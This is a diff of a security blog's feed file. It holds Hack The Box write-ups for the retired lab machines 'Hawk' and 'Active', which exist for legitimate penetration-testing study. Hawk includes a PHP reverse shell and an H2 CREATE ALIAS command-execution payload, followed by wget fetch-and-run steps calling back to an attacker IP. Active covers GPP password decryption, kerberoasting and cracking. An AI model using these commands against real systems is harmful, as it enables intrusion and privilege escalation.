-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-see-that-its-running-drupal-cms&quot;&gt;We see that it’s running drupal CMS&lt;/h4&gt;
-&lt;h4 id=&quot;lets-login-with-the-credentials-we-have&quot;&gt;Let’s login with the credentials we have.&lt;/h4&gt;
-&lt;h4 id=&quot;username-daniel-didnt-work-but-admin-worked-and-we-got-in-as-admin-&quot;&gt;Username daniel didn’t work but admin worked and we got in as admin !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;after-we-enumerate-for-a-while-we-will-see-some-interesting-stuff&quot;&gt;After we enumerate for a while we will see some interesting stuff.&lt;/h4&gt;
-&lt;h4 id=&quot;the-content-tab-which-allows-us-to-add-content-and-the-modules-tab&quot;&gt;The content tab which allows us to add content and the modules tab.&lt;/h4&gt;
-&lt;h4 id=&quot;if-we-tried-to-add-content-we-will-get-two-options--article-or-a-basic-page&quot;&gt;If we tried to add content we will get two options : Article or a basic page.&lt;/h4&gt;
-&lt;h4 id=&quot;we-will-focus-on-basic-pages-for-sure-but-we-can-only-use-html--filtered-html-and-plain-text-&quot;&gt;We will focus on basic pages for sure but we can only use html , filtered html and plain text .&lt;/h4&gt;
-&lt;h4 id=&quot;lets-look-in-the-modules-tab&quot;&gt;Let’s look in the modules tab.&lt;/h4&gt;
-&lt;h4 id=&quot;we-will-find-a-module-called-php-filter-which-allows-us-to-use-php-in-pages-after-we-enable-it-we-will-get-a-fourth-option--php-code&quot;&gt;We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great--lets-get-a-reverse-shell&quot;&gt;Great ! Let’s get a reverse shell&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php exec(&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/9090 0&amp;gt;&amp;amp;1'&quot;);&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/9.png&quot; alt=&quot;&quot; /&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-check-our-listener&quot;&gt;Let’s check our listener.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;bam-we-got-a-low-privilege-shell-as-www-data-&quot;&gt;bam we got a low privilege shell as www-data !&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;privilege-escalation-to-daniel&quot;&gt;Privilege Escalation to daniel&lt;/h3&gt;
-&lt;h4 id=&quot;so-were-now-in-as-www-data-lets-check-sensetive-files-first&quot;&gt;So we’re now in as www-data let’s check sensetive files first.&lt;/h4&gt;
-&lt;h4 id=&quot;in-drupal-7-documentation-this-section-its-mentioned-that-settingsphp-contains-where-the-database-is-located--how-to-access-it-and-the-credentials-to-access-it-so-this-file-has-some-sensetive-information-lets-check-that-out&quot;&gt;In drupal 7 documentation &lt;a href=&quot;https://www.drupal.org/docs/7/install/step-3-create-settingsphp-and-the-files-directory&quot;&gt;This section&lt;/a&gt; it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensetive information let’s check that out.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/12.png&quot; alt=&quot;&quot; /&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-a-password--drupal4hawk--lets-try-ssh&quot;&gt;We got a password : drupal4hawk , Let’s try ssh&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-in--but-when-we-login-we-get-a-python-interpreter-we-will-get-a-shell-with-pty&quot;&gt;We got in ! But when we login we get a python interpreter. We will get a shell with pty&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import pty
-pty.spawn(&quot;/bin/sh&quot;)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-got-user--d&quot;&gt;And we got user ! :D&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;accessing-h2-database&quot;&gt;Accessing H2 Database&lt;/h3&gt;
-&lt;h4 id=&quot;now-with-some-regular-enumeration-if-we-check-out-root-processes-we-will-see-those-2-processes&quot;&gt;Now with some regular enumeration if we check out root processes we will see those 2 processes.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;sounds-familiar--yup-the-h2-database&quot;&gt;Sounds familiar ? Yup the H2 Database.&lt;/h4&gt;
-&lt;h4 id=&quot;if-we-return-to-our-nmap-scan-we-will-see-port-8082-running-h2-database-http-console&quot;&gt;If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-know-that-its-running-as-root-so-lets-try-to-access-that&quot;&gt;Now we know that it’s running as root so let’s try to access that.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;remote-connection-is-disabled-this-means-that-we-can-only-connect-locally&quot;&gt;Remote connection is disabled. This means that we can only connect locally.&lt;/h4&gt;
-&lt;h4 id=&quot;to-bypass-that-we-will-use-ssh-tunneling&quot;&gt;To bypass that we will use ssh tunneling.&lt;/h4&gt;
-&lt;h4 id=&quot;and-if-you-dont-know-what-ssh-tunneling-is--simply-we-will-forward-the-connection-from-the-box-to-our-machine-this-means-that-the-h2-console-will-be-accessed-locally-from-the-box-then-that-connection-will-be-forwarded-to-us&quot;&gt;And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-if-we-visit-our-localhost-on-port-8080-we-will-get-the-login-page&quot;&gt;Now if we visit our localhost on port 8080 we will get the login page.&lt;/h4&gt;
-&lt;h4 id=&quot;by-default-it-doesnt-have-a-password-so-we-can-access-the-console-without-credentials-but-when-we-login-without-credentials-it-gives-an-error&quot;&gt;By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;lets-try-changing-the-jdbc-url-to-something-we-know-that-it-exists-root&quot;&gt;Let’s try changing the JDBC URL to something we know that it exists. /root&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-worked--now-we-have-access-to-the-console&quot;&gt;It worked . Now we have access to the console.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/21.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;abusing-h2-database-alias-and-privilege-escalation-to-root&quot;&gt;Abusing H2 Database ALIAS and Privilege Escalation to root&lt;/h3&gt;
-&lt;h4 id=&quot;basically-the-create-alias-method-creates-a-function-that-executes-java-code&quot;&gt;Basically the &lt;a href=&quot;http://www.h2database.com/html/grammar.html#create_alias&quot;&gt;CREATE ALIAS&lt;/a&gt; method creates a function that executes java code.&lt;/h4&gt;
-&lt;h4 id=&quot;since-we-can-execute-java-code-then-we-can-do-anything-so-we-will-create-a-function-that-executes-system-commands-then-we-will-get-a-shell&quot;&gt;Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell.&lt;/h4&gt;
-&lt;h4 id=&quot;first-we-will-create-alias-called-shellexec-the-payload-will-be-like-this-&quot;&gt;First we will create ALIAS called SHELLEXEC. The payload will be like this :&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;;  }$$;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-execute-system-commands-by-calling-the-function-that-we-created-lets-execute-whoami&quot;&gt;Then we will execute system commands by calling the function that we created. Let’s execute whoami.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;whoami&quot;)&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-see-root-d&quot;&gt;And we see root :D&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;note-that-h2-database-alias-exploit-is-not-mine-credits-go-to-the-creator--check-his-write-up-about-the-exploit-here&quot;&gt;&lt;em&gt;NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit &lt;a href=&quot;https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html&quot;&gt;here&lt;/a&gt;&lt;/em&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-since-we-can-execute-system-commands-its-over--we-can-get-a-root-shell&quot;&gt;now since we can execute system commands it’s over ! We can get a root shell.&lt;/h4&gt;
-&lt;h4 id=&quot;but-we-cant-write-a-shell-command-and-execute-it-right-away-it-wont-work-so-instead-of-that-we-can-write-our-shell-in-a-sh-file-then-upload-it-and-execute-it&quot;&gt;But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it.&lt;/h4&gt;
-&lt;h4 id=&quot;another-way-is-to-use-msfvenom-but-its-not-needed-here-because-the-exploit-is-simple&quot;&gt;Another way is to use msfvenom but it’s not needed here because the exploit is simple.&lt;/h4&gt;
-&lt;h4 id=&quot;first-we-will-create-the-shell-file&quot;&gt;First we will create the shell file.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/1234 0&amp;gt;&amp;amp;1 &amp;gt; shell&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-set-up-a-http-server-with-python-to-host-the-shell&quot;&gt;Then we will set up a HTTP server with python to host the shell.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python -m SimpleHTTPServer 7777&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-will-use-wget-to-get-the-shell-file-on-the-box&quot;&gt;Now we will use wget to get the shell file on the box.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;wget http://10.10.xx.xx:7777/shell&quot;)&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/25.png&quot; alt=&quot;&quot; /&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-will-make-the-file-executable&quot;&gt;We will make the file executable.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;chmod +x shell&quot;)&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-rename-it-to-shellsh&quot;&gt;Then we will rename it to shell.sh&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;mv shell shell.sh&quot;)&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-finally-we-execute-it&quot;&gt;And finally we execute it.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;call SHELLEXEC(&quot;bash shell.sh&quot;)&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/hawk/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-dont-get-a-response-which-is-a-good-sign-lets-check-our-listener&quot;&gt;We don’t get a response which is a good sign. Let’s check our listener.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hawk/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-we-get-a-shell-as-root--d&quot;&gt;And we get a shell as root ! :D&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
-&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---jerry&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/jerry/&quot;&gt;Hack The Box - Jerry&lt;/a&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---active&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/active/&quot;&gt;Hack The Box - Active&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><summary type="html">Hawk has retired and this is my write-up about it. It’s a Linux box and it’s ip is 10.10.10.102 so let’s jump right in ! Nmap Starting with a simple nmap scan to scan tor TCP , UDP ports and services. nmap -sV -sT -sU 10.10.10.102 We will see that we got FTP on port 21 , SSH on port 22 , HTTP on port 80 running apache server and HTTP on port 8082 running H2 Database HTTP Console. FTP Since there’s FTP on the box let’s check if we can do anonymous login. We could login as anonymous and we got a file called : .drupal.txt.enc Since it ends with .enc then it’s an encrypted file. Let’s run file command against it to get more information. file drupal.txt.enc drupal.txt.enc : openssl enc'd data with salted password , base64 encoded So base64 encoded ? Let’s decode it. base64 -d drupal.txt.enc &amp;gt; drupal_decoded.txt.enc Now the file is ready for bruteforcing. Decrypting The File To get the password for decryption we will use a tool called bruteforce-salted-openssl with rockyou. It’s already installed on kali but if you’re not using kali you can get it from here Now there’s a small problem. We need to specify the right cipher and digest to be able to crack the file so we have to do some guessing. I already cracked it so the cipher is AES-256-CBC and the digest is SHA256. bruteforce-salted-openssl -t 50 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal_decoded.txt.enc -1 You may ask yourself why I didn’t specify the cipher. I didn’t specify it because the tool uses AES-256-CBC by default. Great ! We got the password : friends . Let’s decrypt the file. openssl aes-256-cbc -d -in drupal_decoded.txt.enc -out drupal.txt -k friends Now we have a username : “daniel” and a password : PencilKeybaordScanner123 Drupal We see in the message that the password is for a portal. But what portal? Let’s visit the website on port 80 We see that it’s running drupal CMS Let’s login with the credentials we have. Username daniel didn’t work but admin worked and we got in as admin ! After we enumerate for a while we will see some interesting stuff. The content tab which allows us to add content and the modules tab. If we tried to add content we will get two options : Article or a basic page. We will focus on basic pages for sure but we can only use html , filtered html and plain text . Let’s look in the modules tab. We will find a module called php filter which allows us to use php in pages. After we enable it we will get a fourth option : php code Great ! Let’s get a reverse shell &amp;lt;?php exec(&quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/9090 0&amp;gt;&amp;amp;1'&quot;); Let’s check our listener. bam we got a low privilege shell as www-data ! Privilege Escalation to daniel So we’re now in as www-data let’s check sensetive files first. In drupal 7 documentation This section it’s mentioned that settings.php contains where the database is located , how to access it and the credentials to access it. So this file has some sensetive information let’s check that out. We got a password : drupal4hawk , Let’s try ssh We got in ! But when we login we get a python interpreter. We will get a shell with pty import pty pty.spawn(&quot;/bin/sh&quot;) And we got user ! :D Accessing H2 Database Now with some regular enumeration if we check out root processes we will see those 2 processes. Sounds familiar ? Yup the H2 Database. If we return to our nmap scan we will see port 8082 running H2 Database HTTP Console. Now we know that it’s running as root so let’s try to access that. Remote connection is disabled. This means that we can only connect locally. To bypass that we will use ssh tunneling. And if you don’t know what ssh tunneling is … simply we will forward the connection from the box to our machine. This means that the H2 console will be accessed locally from the box then that connection will be forwarded to us. ssh -L 8080:127.0.0.1:8082 daniel@10.10.10.102 Now if we visit our localhost on port 8080 we will get the login page. By default it doesn’t have a password so we can access the console without credentials but when we login without credentials it gives an error. Let’s try changing the JDBC URL to something we know that it exists. /root It worked . Now we have access to the console. Abusing H2 Database ALIAS and Privilege Escalation to root Basically the CREATE ALIAS method creates a function that executes java code. Since we can execute java code then we can do anything. So we will create a function that executes system commands then we will get a shell. First we will create ALIAS called SHELLEXEC. The payload will be like this : CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); return s.hasNext() ? s.next() : &quot;&quot;; }$$; Then we will execute system commands by calling the function that we created. Let’s execute whoami. call SHELLEXEC(&quot;whoami&quot;) And we see root :D NOTE: That H2 Database ALIAS exploit is not mine. Credits go to the creator . check his write-up about the exploit here now since we can execute system commands it’s over ! We can get a root shell. But We can’t write a shell command and execute it right away it won’t work so instead of that we can write our shell in a .sh file then upload it and execute it. Another way is to use msfvenom but it’s not needed here because the exploit is simple. First we will create the shell file. bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.xx.xx/1234 0&amp;gt;&amp;amp;1 &amp;gt; shell Then we will set up a HTTP server with python to host the shell. python -m SimpleHTTPServer 7777 Now we will use wget to get the shell file on the box. call SHELLEXEC(&quot;wget http://10.10.xx.xx:7777/shell&quot;) We will make the file executable. call SHELLEXEC(&quot;chmod +x shell&quot;) Then we will rename it to shell.sh call SHELLEXEC(&quot;mv shell shell.sh&quot;) And finally we execute it. call SHELLEXEC(&quot;bash shell.sh&quot;) We don’t get a response which is a good sign. Let’s check our listener. And we get a shell as root ! :D That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Jerry Next Hack The Box write-up : Hack The Box - Active</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/hawk/0.png" /></entry></feed>
+&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Active was a great box and very realistic , Kinda easy if you’re familiar with windows active directory security. But if you’re not … then this box will teach you something. It’s a windows box and its ip is 10.10.10.100 so let’s jump right in . Nmap As Always we will start with nmap to scan for TCP ports and Services nmap -sV -sT 10.10.10.100 And we see many ports open but we will focus on the important ports only. Kerberos on 88 , netbios-ssn on 139 , ldap on 389 and 3268. SMB Enumeration Since we have netbios-ssn open on port 139 let’s run smbmap and see what we get. If you’re not on kali you can get smbmap from here smbmap -H 10.10.10.100 And we see that we can only access the share Replication anonymously smbclient //10.10.10.100/Replication After we access the share we will find a file called Groups.xml in \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\ By looking at the file we will find a username and an encrypted password. Decrypting GPP So if you don’t know what’s that cpassword … it’s called gpp (Group Policy Password) And I won’t talk about it in the write-up. If you’re interested here’s a great resource to read about it To decrypt it there’s a tool called gpp-decrypt. If you’re not on kali get it from here And we got the password GPPstillStandingStrong2k18 User Now we have the credentials SVC_TGS:GPPstillStandingStrong2k18 and we can own user smbclient //10.10.10.100/Users -U SVC_TGS Kerberoasting Now if we return to our nmap scan. We will see that we have kerberos running on port 88 and we have owned a user on the box so we will go for kerberoasting and if you don’t know what kerberoasting technique is you can read this great series about it Part 1 Part 2 Part 3 First we will add 10.10.10.100 to our /etc/hosts Then We will use GetUserSPNs.py from impacket to get administrator Kerberos ticket ./GetUserSPNs.py -request active.htb/SVC_TGS And we got the ticket in john format so it’s ready for cracking. We will just add the option -outputfile to save the ticket in a file and we’re ready to go. Cracking The Ticket We will use john to crack the ticket with rockyou.txt And one of the problems that I faced when I was trying to crack the ticket is that john wasn’t recognizing the format so make sure you’re using an updated version of both impacket and john because impacket also had problems with the hash format output. For me the problem was with john so I solved it by using jumbo version of john. ./john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt And we got the administrator password : Ticketmaster1968 Root Now we can easily get a root shell using psexec.py from impacket ./psexec.py administrator@active.htb That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Hack The Box write-up : Hack The Box - Hawk Next Hack The Box write-up : Hack The Box - Waldo</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/active/0.png" /></entry></feed>
